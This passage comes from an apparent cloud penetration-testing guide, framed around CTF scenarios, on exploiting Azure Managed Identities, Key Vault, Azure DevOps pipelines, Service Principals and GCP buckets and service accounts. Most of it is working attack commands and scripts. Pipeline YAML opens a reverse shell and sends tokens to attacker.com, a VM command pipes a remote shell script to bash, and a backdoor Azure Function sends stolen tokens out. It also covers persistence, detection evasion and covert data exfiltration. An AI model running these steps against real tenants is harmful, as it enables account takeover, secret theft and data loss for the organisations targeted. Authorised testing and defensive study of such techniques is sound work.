        print("[*] Azure Managed Identity Exploitation Tool")
        print("[*] Attempting to acquire tokens...\n")
        
        # Acquire tokens for different resources
        resources = {
            "ARM": "https://management.azure.com/",
            "KeyVault": "https://vault.azure.net",
            "Storage": "https://storage.azure.com/",
            "Graph": "https://graph.microsoft.com/"
        }
        
        for name, resource in resources.items():
            token = self.get_token(resource)
            if token:
                claims = self.decode_token(token)
                if claims:
                    print(f"    Identity: {claims.get('oid')}")
                    print(f"    Expires: {datetime.fromtimestamp(claims.get('exp'))}")
        
        # Enumerate resources
        if "ARM" in self.tokens:
            print("\n" + "="*60)
            self.enumerate_resources(self.tokens["ARM"])
        
        # Enumerate Key Vaults
        if "ARM" in self.tokens and "KeyVault" in self.tokens:
            print("\n" + "="*60)
            self.enumerate_keyvaults(self.tokens["ARM"], self.tokens["KeyVault"])

if __name__ == "__main__":
    exploit = ManagedIdentityExploit()
    exploit.run()
```

### Common Misconfigurations

#### Overly Permissive Role Assignments

```bash
# Check for broad scope assignments
az role assignment list --all --output json | \
  jq -r '.[] | select(.scope | contains("/subscriptions/") and (contains("/resourceGroups/") | not)) | 
  "\(.principalName) has \(.roleDefinitionName) on \(.scope)"'

# [Inference] Managed identities with Contributor or Owner at subscription level have extensive access
```

#### Managed Identity on Public-Facing Resources

```bash
# VMs with public IPs and managed identity
az vm list --query "[?identity!=null]" --output json | \
  jq -r '.[] | select(.networkProfile.networkInterfaces[].ipConfigurations[].publicIpAddress != null) | .name'

# Function Apps with anonymous access and managed identity
az functionapp list --query "[?identity!=null]" --output json | \
  jq -r '.[] | .name'
# Then check each for anonymous functions
```

#### Insecure IMDS Access

```bash
# On Linux VMs, check iptables rules
sudo iptables -L -n | grep 169.254.169.254

# [Inference] If no iptables rules block IMDS, any process can access managed identity

# Proper defense: Block IMDS except for specific users
sudo iptables -A OUTPUT -d 169.254.169.254 -m owner ! --uid-owner azureuser -j DROP
```

### Important Related Topics

For comprehensive Azure security testing, explore these related areas:

- **Azure AD Enumeration**: Using tools like AADInternals, ROADtools for tenant reconnaissance
- **Azure DevOps Exploitation**: Pipeline secrets, service connections, artifact poisoning
- **Azure Kubernetes Service (AKS) Security**: Pod identity, RBAC bypass, node escalation
- **Azure Storage Security**: Blob access, SAS token abuse, storage analytics exploitation
- **Conditional Access Bypass**: Device compliance, location spoofing, legacy authentication

---

## Azure Key Vault Enumeration

### Overview

Azure Key Vault is a cloud service for securely storing and accessing secrets, keys, and certificates. Misconfigurations in access policies, RBAC assignments, or exposure through managed identities make it a high-value target in CTF scenarios.

### Prerequisites

```bash
# Install Azure CLI
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash

# Install PowerShell (for Az PowerShell module)
sudo apt-get install -y wget apt-transport-https software-properties-common
wget -q https://packages.microsoft.com/config/debian/11/packages-microsoft-prod.deb
sudo dpkg -i packages-microsoft-prod.deb
sudo apt-get update
sudo apt-get install -y powershell
```

### Authentication Methods

#### Method 1: Stolen Credentials

```bash
# Login with username/password
az login -u user@domain.com -p 'Password123!'

# Login with service principal
az login --service-principal \
  -u <app-id> \
  -p <password-or-cert> \
  --tenant <tenant-id>
```

#### Method 2: Managed Identity (From Compromised VM)

```bash
# Test for managed identity availability
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H Metadata:true

# Get access token
TOKEN=$(curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net' -H Metadata:true | jq -r .access_token)

# Use token with Azure CLI
az login --identity
```

#### Method 3: Azure CLI Token Theft

```bash
# Linux token locations
~/.azure/accessTokens.json
~/.azure/azureProfile.json

# Extract and reuse tokens
cat ~/.azure/accessTokens.json | jq -r '.[0].accessToken'
```

### Enumeration Techniques

#### List Accessible Key Vaults

```bash
# List all key vaults in subscription
az keyvault list --query "[].{Name:name, ResourceGroup:resourceGroup}" -o table

# List vaults across all subscriptions
az account list --all -o table
for sub in $(az account list --query "[].id" -o tsv); do
  az account set -s $sub
  az keyvault list -o table
done
```

#### Check Key Vault Permissions

```bash
# List access policies for specific vault
az keyvault show --name <vault-name> --query "properties.accessPolicies" -o json

# Check RBAC assignments
az role assignment list --scope /subscriptions/<sub-id>/resourceGroups/<rg-name>/providers/Microsoft.KeyVault/vaults/<vault-name> -o table
```

#### Enumerate Vault Contents

```bash
# List secrets (requires 'List' permission)
az keyvault secret list --vault-name <vault-name> -o table

# List keys
az keyvault key list --vault-name <vault-name> -o table

# List certificates
az keyvault certificate list --vault-name <vault-name> -o table
```

#### Retrieve Secret Values

```bash
# Get secret value (requires 'Get' permission)
az keyvault secret show --vault-name <vault-name> --name <secret-name> --query "value" -o tsv

# Download all secrets (batch operation)
for secret in $(az keyvault secret list --vault-name <vault-name> --query "[].name" -o tsv); do
  echo "[+] $secret"
  az keyvault secret show --vault-name <vault-name> --name $secret --query "value" -o tsv
done
```

#### Direct API Access (Using Bearer Token)

```bash
# Set variables
VAULT_NAME="target-vault"
SECRET_NAME="admin-password"
TOKEN="<your-access-token>"

# REST API call
curl "https://${VAULT_NAME}.vault.azure.net/secrets/${SECRET_NAME}?api-version=7.4" \
  -H "Authorization: Bearer ${TOKEN}"
```

### Advanced Enumeration

#### Check for Soft-Deleted Secrets

```bash
# List deleted secrets (if soft-delete enabled)
az keyvault secret list-deleted --vault-name <vault-name> -o table

# Recover deleted secret
az keyvault secret recover --vault-name <vault-name> --name <secret-name>
```

#### Enumerate Network Rules

```bash
# Check firewall configuration
az keyvault show --name <vault-name> --query "properties.networkAcls" -o json

# Check if private endpoint exists
az keyvault private-endpoint-connection list --vault-name <vault-name> -o table
```

#### Diagnostic Logs Analysis

```bash
# Check if diagnostic settings exist
az monitor diagnostic-settings list --resource /subscriptions/<sub-id>/resourceGroups/<rg>/providers/Microsoft.KeyVault/vaults/<vault-name>
```

### Tools

#### MicroBurst (PowerShell)

```powershell
# Install
git clone https://github.com/NetSPI/MicroBurst
Import-Module ./MicroBurst/MicroBurst.psm1

# Enumerate Key Vaults
Get-AzureKeyVaults -Verbose

# Export all secrets
Get-AzureKeyVaultSecrets -Verbose -OutputFile secrets.txt
```

#### ROADtools

```bash
# Install
pip install roadrecon

# Gather Azure AD data (includes Key Vault permissions)
roadrecon auth -u user@domain.com -p Password123!
roadrecon gather
roadrecon gui
```

#### Azure CLI Automation Script

```bash
#!/bin/bash
# keyvault_enum.sh

VAULT_NAME=$1
OUTPUT_FILE="vault_dump_${VAULT_NAME}.txt"

echo "[*] Enumerating Key Vault: $VAULT_NAME" | tee $OUTPUT_FILE

echo -e "\n[+] Secrets:" | tee -a $OUTPUT_FILE
az keyvault secret list --vault-name $VAULT_NAME --query "[].{Name:name, Enabled:attributes.enabled}" -o table | tee -a $OUTPUT_FILE

for secret in $(az keyvault secret list --vault-name $VAULT_NAME --query "[].name" -o tsv); do
  echo -e "\n[SECRET] $secret" | tee -a $OUTPUT_FILE
  az keyvault secret show --vault-name $VAULT_NAME --name $secret --query "value" -o tsv | tee -a $OUTPUT_FILE
done

echo -e "\n[+] Keys:" | tee -a $OUTPUT_FILE
az keyvault key list --vault-name $VAULT_NAME -o table | tee -a $OUTPUT_FILE

echo -e "\n[+] Certificates:" | tee -a $OUTPUT_FILE
az keyvault certificate list --vault-name $VAULT_NAME -o table | tee -a $OUTPUT_FILE
```

### Common Misconfigurations

1. **Overly Permissive Access Policies**: Service principals or users with "Get" and "List" on all secrets
2. **Public Network Access**: Key Vaults without IP restrictions or private endpoints
3. **Managed Identity Over-Privilege**: VMs with managed identities having unnecessary Key Vault access
4. **Disabled Soft-Delete/Purge Protection**: Allows permanent deletion of secrets
5. **Logging Disabled**: No audit trail for access attempts

---

## Azure DevOps Reconnaissance

### Overview

Azure DevOps (ADO) stores source code, build pipelines, secrets (variable groups), and service connections. Compromise of ADO often leads to lateral movement into production environments through pipeline abuse or credential theft.

### Authentication

#### PAT (Personal Access Token) Usage

```bash
# Set PAT as environment variable
export AZURE_DEVOPS_EXT_PAT=<your-pat>

# Or use in Git operations
git clone https://<pat>@dev.azure.com/<org>/<project>/_git/<repo>
```

#### OAuth Token from Browser

```bash
# Extract from browser storage (F12 > Application > Cookies)
# Look for: UserAuthentication, __RequestVerificationToken
```

#### Azure CLI Integration

```bash
# Login (uses same auth as Azure)
az devops login

# Set default organization
az devops configure --defaults organization=https://dev.azure.com/<org-name>
```

### Enumeration Techniques

#### Organization Discovery

```bash
# List accessible organizations
az devops project list --org https://dev.azure.com/<org-name> -o table

# Enumerate users in organization
az devops user list --org https://dev.azure.com/<org-name> -o table
```

#### Project Enumeration

```bash
# List all projects
az devops project list -o table

# Show project details
az devops project show --project <project-name> --org https://dev.azure.com/<org-name>
```

#### Repository Reconnaissance

```bash
# List repositories in project
az repos list --project <project-name> -o table

# Get repository details
az repos show --repository <repo-name> --project <project-name>

# Clone repository
git clone https://dev.azure.com/<org>/<project>/_git/<repo>
```

#### Branch and Commit Analysis

```bash
# List branches
az repos ref list --repository <repo-name> --project <project-name>

# Search commit messages for secrets
git clone https://dev.azure.com/<org>/<project>/_git/<repo>
cd <repo>
git log --all --oneline | grep -iE "password|secret|key|token"

# Use truffleHog for secret scanning
trufflehog git https://dev.azure.com/<org>/<project>/_git/<repo> --only-verified
```

#### Pipeline Enumeration

```bash
# List pipelines
az pipelines list --project <project-name> -o table

# Show pipeline details (YAML content)
az pipelines show --id <pipeline-id> --project <project-name>

# List pipeline runs
az pipelines runs list --pipeline-id <pipeline-id> --project <project-name> -o table

# Download pipeline logs
az pipelines runs show --id <run-id> --project <project-name>
```

#### Variable Groups (Secret Storage)

```bash
# List variable groups
az pipelines variable-group list --project <project-name> -o table

# Show variable group contents
az pipelines variable-group show --id <group-id> --project <project-name>

# [Inference] Variable values may be masked in output; exploitation may require pipeline execution
```

#### Service Connections

```bash
# List service connections (Azure subscriptions, GitHub, Docker registries)
az devops service-endpoint list --project <project-name> -o table

# Show service connection details
az devops service-endpoint show --id <endpoint-id> --project <project-name>

# [Inference] Service principals used in connections may have elevated Azure permissions
```

#### Work Items and Boards

```bash
# List work items (may contain sensitive info in descriptions/attachments)
az boards work-item query --wiql "SELECT [System.Id], [System.Title] FROM WorkItems" --project <project-name>
```

### Tools

#### ADOKit (Automated Reconnaissance)

```bash
# Install
git clone https://github.com/xforcered/ADOKit
cd ADOKit
dotnet build

# Enumerate with PAT
./ADOKit.exe recon /credential:<pat> /url:https://dev.azure.com/<org>

# Extract secrets from variable groups
./ADOKit.exe secrets /credential:<pat> /url:https://dev.azure.com/<org> /project:<project-name>
```

#### Azurite (Azure DevOps Security Tool)

```bash
# [Unverified] Tool availability may vary; check GitHub for current status
git clone https://github.com/FSecureLABS/Azurite
cd Azurite
pip install -r requirements.txt

# Enumerate projects
python azurite.py --token <pat> --org <org-name> enumerate
```

#### Manual API Access

```bash
# REST API authentication header
HEADER="Authorization: Basic $(echo -n :$AZURE_DEVOPS_PAT | base64)"

# List projects
curl -s -H "$HEADER" "https://dev.azure.com/<org>/_apis/projects?api-version=7.0"

# Get repository files
curl -s -H "$HEADER" "https://dev.azure.com/<org>/<project>/_apis/git/repositories/<repo>/items?path=/&recursionLevel=full&api-version=7.0"

# Get pipeline variables
curl -s -H "$HEADER" "https://dev.azure.com/<org>/<project>/_apis/pipelines/<pipeline-id>/runs?api-version=7.0"
```

### Pipeline Abuse for Code Execution

#### Self-Hosted Agent Compromise

```bash
# If pipeline uses self-hosted agents, inject malicious YAML

# azure-pipelines.yml
trigger:
- main

pool:
  name: 'SelfHostedPool'

steps:
- script: |
    whoami
    cat /etc/passwd
    env
    # Reverse shell
    bash -i >& /dev/tcp/attacker-ip/4444 0>&1
  displayName: 'Pwn Step'
```

#### Exfiltrate Service Connection Credentials

```yaml
# azure-pipelines.yml
steps:
- task: AzureCLI@2
  inputs:
    azureSubscription: 'ProductionServiceConnection'
    scriptType: 'bash'
    scriptLocation: 'inlineScript'
    inlineScript: |
      az account show
      az keyvault secret list --vault-name prod-vault
      curl https://attacker.com/exfil -d "$(az account get-access-token --query accessToken -o tsv)"
```

### Secret Locations in Repositories

#### Common Files to Search

```bash
# Clone and search
git clone https://dev.azure.com/<org>/<project>/_git/<repo>
cd <repo>

# Config files
find . -name "*.config" -o -name "appsettings*.json" -o -name "web.config"

# Environment files
find . -name ".env*" -o -name "*.env"

# Scripts
grep -r "password\|secret\|api_key\|connection_string" . --include="*.ps1" --include="*.sh" --include="*.py"
```

#### Git History Mining

```bash
# Search all commits
git log -p | grep -iE "password|secret|key" -A 5 -B 5

# Check for removed sensitive files
git log --all --full-history --oneline -- "*.key" "*.pem" "*.pfx"

# Use GitLeaks
gitleaks detect --source . --verbose
```

### Privilege Escalation Paths

1. **PAT with Build Permissions** → Execute malicious pipeline → Access service connections → Azure subscription access
2. **Repository Contributor** → Modify YAML → Trigger pipeline on self-hosted agent → System-level access
3. **Variable Group Reader** → Extract secrets → Lateral movement to other systems
4. **Service Connection Permissions** → Impersonate service principal → Azure resource access

### Common Misconfigurations

1. **Overly Permissive PATs**: Tokens with full access scopes instead of least privilege
2. **Public Repositories**: Sensitive code/secrets in public visibility projects
3. **Weak Branch Policies**: No PR review requirements allowing direct commits
4. **Service Connection Over-Privilege**: Service principals with Owner/Contributor on subscriptions
5. **No Secret Scanning**: Missing tools like GitHub Advanced Security for ADO

---

## Service Principal Abuse

### Overview

Service Principals (SPNs) are non-human identities used for automation and application authentication in Azure. They often have elevated permissions across subscriptions, Key Vaults, and other resources. Compromising an SPN typically provides persistent, high-privilege access.

### Service Principal Identification

#### From Azure CLI

```bash
# List all SPNs you can see (requires Azure AD Reader or higher)
az ad sp list --all --query "[].{DisplayName:displayName, AppId:appId, ObjectId:id}" -o table

# Show specific SPN details
az ad sp show --id <app-id-or-object-id>

# List owned applications (may include SPNs)
az ad app list --show-mine -o table
```

#### From Compromised Application

```bash
# Environment variables (common in App Services, Functions)
echo $AZURE_CLIENT_ID
echo $AZURE_CLIENT_SECRET
echo $AZURE_TENANT_ID

# Check App Service configuration
az webapp config appsettings list --name <app-name> --resource-group <rg-name>

# Kubernetes secrets (AKS environments)
kubectl get secrets -n <namespace>
kubectl get secret <secret-name> -n <namespace> -o json
```

#### From Configuration Files

```bash
# Common locations on compromised VMs/containers
/etc/kubernetes/azure.json
~/.azure/credentials
/opt/app/appsettings.json
/var/www/html/web.config

# Search for patterns
grep -r "client_id\|client_secret\|tenant_id" /etc/ /opt/ /var/ 2>/dev/null
```

### Authentication with Service Principal

#### Azure CLI

```bash
# Login with secret
az login --service-principal \
  -u <app-id> \
  -p <client-secret> \
  --tenant <tenant-id>

# Login with certificate
az login --service-principal \
  -u <app-id> \
  -p /path/to/cert.pem \
  --tenant <tenant-id>

# Verify identity
az account show
```

#### PowerShell Az Module

```powershell
# Install module if needed
Install-Module -Name Az -AllowClobber -Scope CurrentUser

# Connect with secret
$SecureSecret = ConvertTo-SecureString "<client-secret>" -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential("<app-id>", $SecureSecret)
Connect-AzAccount -ServicePrincipal -Credential $Credential -Tenant "<tenant-id>"

# Verify
Get-AzContext
```

#### Direct API Token Acquisition

```bash
# Get OAuth token via REST API
curl -X POST \
  "https://login.microsoftonline.com/<tenant-id>/oauth2/v2.0/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=<app-id>&scope=https://management.azure.com/.default&client_secret=<client-secret>&grant_type=client_credentials"

# Extract token
TOKEN=$(curl -X POST "https://login.microsoftonline.com/<tenant-id>/oauth2/v2.0/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=<app-id>&scope=https://management.azure.com/.default&client_secret=<client-secret>&grant_type=client_credentials" | jq -r .access_token)

# Use token with REST API
curl -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"
```

### Permission Enumeration

#### Role Assignments

```bash
# List all role assignments for the SPN
az role assignment list --assignee <app-id> --all -o table

# Check specific scope
az role assignment list --assignee <app-id> --scope /subscriptions/<sub-id> -o table

# Identify highly privileged roles
az role assignment list --assignee <app-id> --query "[?roleDefinitionName=='Owner' || roleDefinitionName=='Contributor']" -o table
```

#### Azure AD Permissions

```bash
# List directory roles (requires Azure AD permissions)
az rest --method GET --url "https://graph.microsoft.com/v1.0/servicePrincipals/<object-id>/appRoleAssignments"

# Check for privileged roles
# Global Administrator, Application Administrator, Cloud Application Administrator
```

#### API Permissions (Microsoft Graph, etc.)

```bash
# Show OAuth2 permissions
az ad app show --id <app-id> --query "requiredResourceAccess" -o json

# Translate to readable format
az ad app permission list --id <app-id> -o table
```

### Exploitation Techniques

#### Subscription Takeover (Owner/Contributor Role)

```bash
# Create admin user in subscription
az ad user create --display-name "BackdoorAdmin" --password "ComplexPass123!" --user-principal-name backdoor@domain.com

# Assign Owner role to backdoor user
az role assignment create --assignee backdoor@domain.com --role Owner --scope /subscriptions/<sub-id>

# Create another SPN for persistence
az ad sp create-for-rbac --name "PersistenceApp" --role Contributor --scopes /subscriptions/<sub-id>
```

#### Key Vault Secret Extraction

```bash
# If SPN has Key Vault access
az keyvault list -o table
az keyvault secret list --vault-name <vault-name> -o table

# Mass extraction
for vault in $(az keyvault list --query "[].name" -o tsv); do
  echo "[+] Vault: $vault"
  for secret in $(az keyvault secret list --vault-name $vault --query "[].name" -o tsv); do
    echo "  [SECRET] $secret"
    az keyvault secret show --vault-name $vault --name $secret --query "value" -o tsv
  done
done
```

#### Azure AD Privilege Escalation

```bash
# If SPN has privileged Azure AD roles

# Add self to Azure AD role (requires Global Admin or equivalent)
az rest --method POST \
  --url "https://graph.microsoft.com/v1.0/directoryRoles/<role-id>/members/\$ref" \
  --body "{'@odata.id': 'https://graph.microsoft.com/v1.0/users/<user-object-id>'}"

# Create new application with high permissions
az ad app create --display-name "EvilApp" --required-resource-accesses @permissions.json
```

#### Storage Account Access

```bash
# List storage accounts (if Contributor/Reader role)
az storage account list -o table

# Get storage account keys (requires permissions)
az storage account keys list --account-name <storage-name> --resource-group <rg-name>

# List blobs
az storage blob list --account-name <storage-name> --container-name <container-name> --account-key <key>

# Download sensitive data
az storage blob download --account-name <storage-name> --container-name backups --name database.bak --file ./database.bak --account-key <key>
```

#### VM/VMSS Command Execution

```bash
# List VMs
az vm list -o table

# Execute commands on VM (requires Contributor or specific permissions)
az vm run-command invoke \
  --resource-group <rg-name> \
  --name <vm-name> \
  --command-id RunShellScript \
  --scripts "whoami; cat /etc/shadow; curl http://attacker.com/shell.sh | bash"

# Windows VM
az vm run-command invoke \
  --resource-group <rg-name> \
  --name <vm-name> \
  --command-id RunPowerShellScript \
  --scripts "whoami; net user backdoor Password123! /add; net localgroup Administrators backdoor /add"
```

### Persistence Mechanisms

#### Create Additional Service Principals

```bash
# Create new SPN with same permissions
NEW_SP=$(az ad sp create-for-rbac --name "BackupAccess" --role Contributor --scopes /subscriptions/<sub-id> --query "{appId:appId, password:password, tenant:tenant}" -o json)

echo $NEW_SP | jq '.'
```

#### Add Federated Credentials (Keyless Auth)

```bash
# Add GitHub Actions as federated identity (no secret needed)
az ad app federated-credential create \
  --id <app-id> \
  --parameters '{
    "name": "GitHubFederated",
    "issuer": "https://token.actions.githubusercontent.com",
    "subject": "repo:attacker/evil-repo:ref:refs/heads/main",
    "audiences": ["api://AzureADTokenExchange"]
  }'

# [Inference] This allows authentication from specified GitHub Actions without secrets
```

#### Certificate-Based Authentication

```bash
# Generate certificate
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# Upload to SPN
az ad app credential reset --id <app-id> --cert @cert.pem

# Login with certificate (persists even if secret rotated)
az login --service-principal -u <app-id> -p cert.pem --tenant <tenant-id>
```

#### Backdoor Azure Functions

```bash
# Deploy malicious function with SPN credentials
func init BackdoorFunc --python
cd BackdoorFunc

# Add code to exfiltrate data or maintain access
cat > __init__.py <<EOF
import os
import requests

def main(req):
    token = os.environ.get('AZURE_TOKEN')
    requests.post('http://attacker.com/exfil', data={'token': token})
    return "OK"
EOF

# Deploy using compromised SPN
az functionapp create --name backdoor-func --storage-account <storage> --resource-group <rg> --consumption-plan-location <region>
func azure functionapp publish backdoor-func
```

### Detection Evasion

#### Token Refresh Over Re-authentication

```bash
# [Inference] Refreshing existing tokens may generate less noise than repeated logins

# Extract refresh token (if available)
cat ~/.azure/accessTokens.json | jq -r '.[0].refreshToken'

# Use refresh token to get new access token
curl -X POST "https://login.microsoftonline.com/<tenant-id>/oauth2/v2.0/token" \
  -d "client_id=<app-id>&scope=https://management.azure.com/.default&refresh_token=<refresh-token>&grant_type=refresh_token"
```

#### Avoid Suspicious Operations

- Use `az cli` for operations instead of REST API (mimics normal admin behavior)
- Spread actions across time to avoid burst detection
- Use existing resource groups/locations instead of creating new ones
- Avoid deleting audit logs or disabling diagnostic settings (immediate red flag)

### Tools for SPN Abuse

#### ROADtools (Azure AD Recon)

```bash
pip install roadrecon

# Authenticate with SPN
roadrecon auth --service-principal -u <app-id> -p <secret> -t <tenant-id>

# Gather data
roadrecon gather

# Analyze permissions
roadrecon gui
```

#### Azure Hound

```bash
# [Unverified] Tool may require specific setup; check documentation

# Install
git clone https://github.com/BloodHoundAD/AzureHound
cd AzureHound

# Run with SPN credentials
./azurehound -u <app-id> -p <secret> -t <tenant-id> list --all
```

#### PowerZure (PowerShell)

```powershell
# Install
Install-Module -Name PowerZure

# Import
Import-Module PowerZure

# Login with SPN
$SecureSecret = ConvertTo-SecureString "<secret>" -AsPlainText -Force
$Cred = New-Object PSCredential("<app-id>", $SecureSecret)
Connect-AzAccount -ServicePrincipal -Credential $Cred -Tenant "<tenant-id>"

# Enumerate
Get-AzureRole
Get-AzureTarget -Role Owner
```

#### Custom Automation Script

```bash
#!/bin/bash
# spn_enum.sh - Comprehensive SPN abuse script

APP_ID=$1
SECRET=$2
TENANT=$3

# Login
az login --service-principal -u $APP_ID -p $SECRET --tenant $TENANT

echo "[*] Logged in as: $(az account show --query user.name -o tsv)"

# Enumerate permissions
echo -e "\n[+] Role Assignments:"
az role assignment list --assignee $APP_ID --all -o table

# Key Vaults
echo -e "\n[+] Accessible Key Vaults:"
for vault in $(az keyvault list --query "[].name" -o tsv); do
  echo "  [VAULT] $vault"
  az keyvault secret list --vault-name $vault -o table 2>/dev/null
done

# Storage Accounts
echo -e "\n[+] Storage Accounts:"
az storage account list --query "[].{Name:name, Location:location}" -o table

# VMs
echo -e "\n[+] Virtual Machines:"
az vm list --query "[].{Name:name, ResourceGroup:resourceGroup, PowerState:powerState}" -o table

# Create persistence
echo -e "\n[+] Creating backup SPN:"
az ad sp create-for-rbac --name "Backup-$(date +%s)" --role Contributor
```

### Common Misconfigurations Leading to SPN Abuse

1. **Hardcoded Credentials**: Secrets in source code, config files, or environment variables
2. **Over-Privileged Roles**: Owner/Contributor on entire subscriptions instead of scoped resources
3. **No Secret Rotation**: Long-lived secrets never rotated
4. **Excessive Azure AD Permissions**: Application.ReadWrite.All, RoleManagement.ReadWrite.Directory
5. **No Conditional Access**: SPNs exempt from location/device policies
6. **Shared Secrets**: Same SPN credentials used across dev/staging/prod

### Post-Exploitation Recommendations

After compromising a Service Principal:

1. Document all accessible resources and permissions
2. Extract credentials from Key Vaults, storage accounts, and databases
3. Establish multiple persistence mechanisms (additional SPNs, certificates, federated credentials)
4. Pivot to managed identities on VMs/App Services for alternative access paths
5. Map trust relationships with other tenants or subscriptions
6. Exfiltrate data while maintaining operational security

---

**Important Note on Azure Detection**: Modern Azure environments often have Microsoft Defender for Cloud, Sentinel, or third-party SIEM solutions monitoring for anomalous SPN behavior, unusual API calls, privilege escalations, and mass data access. In CTF scenarios, assume logging is present but may have gaps (e.g., Key Vault access not logged, diagnostic settings disabled on specific resources).

---

# GCP Security Testing

## GCS Bucket Enumeration

### Understanding GCS Bucket Structure

Google Cloud Storage (GCS) buckets use a globally unique naming convention and can be accessed via multiple endpoints:

- `https://storage.googleapis.com/[BUCKET_NAME]/`
- `https://[BUCKET_NAME].storage.googleapis.com/`
- `https://storage.cloud.google.com/[BUCKET_NAME]/`

### Enumeration Techniques

#### Manual Discovery

```bash
# Test bucket existence
curl -I https://storage.googleapis.com/target-bucket-name/

# List bucket contents (if publicly readable)
curl https://storage.googleapis.com/target-bucket-name/

# Using gsutil (requires gcloud SDK)
gsutil ls gs://bucket-name/
gsutil ls -r gs://bucket-name/  # Recursive listing
gsutil ls -L gs://bucket-name/  # Long listing with metadata
```

#### Automated Enumeration Tools

**GCPBucketBrute**

```bash
# Installation
git clone https://github.com/RhinoSecurityLabs/GCPBucketBrute.git
cd GCPBucketBrute

# Basic brute force
python3 gcpbucketbrute.py -k wordlist.txt -p target-project

# Check specific bucket
python3 gcpbucketbrute.py -b target-bucket-name
```

**cloud_enum**

```bash
# Installation
pip3 install cloud-enum

# Enumerate GCP resources
cloud_enum -k target-company --disable-aws --disable-azure

# Custom keyword list
cloud_enum -kf keywords.txt --disable-aws --disable-azure
```

**Bucket Finder (Legacy but still useful)**

```bash
# Install
git clone https://github.com/digininja/BucketFinder.git

# Run against GCS
./bucket_finder.rb wordlist.txt --gcp
```

#### Permission Testing

```bash
# Test read access
gsutil ls gs://bucket-name/

# Test write access
echo "test" > test.txt
gsutil cp test.txt gs://bucket-name/test.txt

# Test delete access
gsutil rm gs://bucket-name/test.txt

# Check IAM policy (requires permissions)
gsutil iam get gs://bucket-name/

# Check bucket ACLs
gsutil acl get gs://bucket-name/
```

#### Common Bucket Naming Patterns

```
company-name
company-backups
company-prod
company-dev
company-staging
company-logs
company-assets
company-data
companyname-public
companyname-private
projectname-artifacts
```

### Exploiting Misconfigured Buckets

#### Information Disclosure

```bash
# Download all accessible contents
gsutil -m cp -r gs://bucket-name/ ./local-directory/

# Search for sensitive files
gsutil ls -r gs://bucket-name/ | grep -E '\.env|\.config|\.json|\.xml|backup|credential|password|secret|api|key'

# Download specific file types
gsutil -m cp -r gs://bucket-name/**.json ./json-files/
gsutil -m cp -r gs://bucket-name/**.xml ./xml-files/
```

#### Data Exfiltration via Public Access

```bash
# Check if bucket is publicly accessible
curl -s https://storage.googleapis.com/bucket-name/ | grep -i "AccessDenied\|AllUsers"

# If publicly readable, use wget for mass download
wget -r -np -nH --cut-dirs=1 https://storage.googleapis.com/bucket-name/
```

---

## GCP Service Account Exploitation

### Service Account Discovery

#### Metadata Service Query

```bash
# Check if running on GCP instance
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/

# Get service account email
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email

# List available service accounts
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/

# Get access token
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

#### Service Account Key Enumeration

```bash
# List service accounts in project (requires permissions)
gcloud iam service-accounts list

# Describe specific service account
gcloud iam service-accounts describe SERVICE_ACCOUNT_EMAIL

# List keys for service account
gcloud iam service-accounts keys list \
  --iam-account=SERVICE_ACCOUNT_EMAIL
```

### Key Extraction and Abuse

#### Finding Service Account Keys

```bash
# Common locations in compromised systems
find / -name "*service-account*.json" 2>/dev/null
find / -name "*gcp*.json" 2>/dev/null
find / -name "key.json" 2>/dev/null
locate credentials.json

# Check environment variables
env | grep -i google
env | grep -i gcp
env | grep GOOGLE_APPLICATION_CREDENTIALS

# Check common application directories
cat ~/.config/gcloud/application_default_credentials.json
cat ~/.config/gcloud/credentials.db
```

#### Using Stolen Service Account Keys

```bash
# Activate service account with key file
gcloud auth activate-service-account --key-file=service-account-key.json

# Verify active account
gcloud auth list

# Get access token programmatically
export GOOGLE_APPLICATION_CREDENTIALS="service-account-key.json"
gcloud auth application-default print-access-token

# Use with API calls
TOKEN=$(gcloud auth application-default print-access-token)
curl -H "Authorization: Bearer $TOKEN" \
  https://cloudresourcemanager.googleapis.com/v1/projects
```

### Privilege Escalation via Service Accounts

#### Enumerate Permissions

```bash
# Test permissions for current service account
gcloud projects get-iam-policy PROJECT_ID

# Check specific service account permissions
gcloud projects get-iam-policy PROJECT_ID \
  --flatten="bindings[].members" \
  --filter="bindings.members:serviceAccount:SA_EMAIL"

# Use gcp-iam-privilege-escalation tool
git clone https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation.git
python3 check_for_privesc.py --service-account SA_EMAIL
```

#### Common Privilege Escalation Paths

**iam.serviceAccountKeys.create Permission**

```bash
# Create new key for higher-privileged service account
gcloud iam service-accounts keys create new-key.json \
  --iam-account=high-priv-sa@project.iam.gserviceaccount.com

# Activate new service account
gcloud auth activate-service-account --key-file=new-key.json
```

**iam.serviceAccounts.actAs Permission**

```bash
# Impersonate service account
gcloud compute instances create test-instance \
  --service-account=high-priv-sa@project.iam.gserviceaccount.com \
  --scopes=cloud-platform

# Or via API
gcloud iam service-accounts add-iam-policy-binding \
  high-priv-sa@project.iam.gserviceaccount.com \
  --member='serviceAccount:current-sa@project.iam.gserviceaccount.com' \
  --role='roles/iam.serviceAccountTokenCreator'
```

**deploymentmanager.deployments.create Permission**

```bash
# Create malicious deployment with elevated privileges
cat > malicious-deployment.yaml <<EOF
resources:
- name: privesc-instance
  type: compute.v1.instance
  properties:
    zone: us-central1-a
    machineType: zones/us-central1-a/machineTypes/f1-micro
    serviceAccounts:
    - email: high-priv-sa@project.iam.gserviceaccount.com
      scopes:
      - https://www.googleapis.com/auth/cloud-platform
EOF

gcloud deployment-manager deployments create privesc \
  --config malicious-deployment.yaml
```

### Service Account Token Manipulation

#### Extract Token from Metadata Service

```bash
# Get short-lived OAuth token
